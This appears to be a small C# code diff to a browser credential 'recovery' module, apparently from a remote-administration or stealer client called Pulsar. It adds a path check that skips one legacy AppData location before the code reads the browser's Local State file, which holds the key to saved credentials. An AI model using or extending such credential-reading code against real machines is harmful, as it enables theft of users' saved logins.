@@ -19,6 +19,11 @@ namespace Pulsar.Client.Recovery.Browsers
         {
             try
             {
+                if (localStatePath.Contains("AppData\\Local\\Application Data\\User Data"))
+                {
+                    return;
+                }
+
                 if (File.Exists(localStatePath))
                 {
                     string localState = File.ReadAllText(localStatePath);
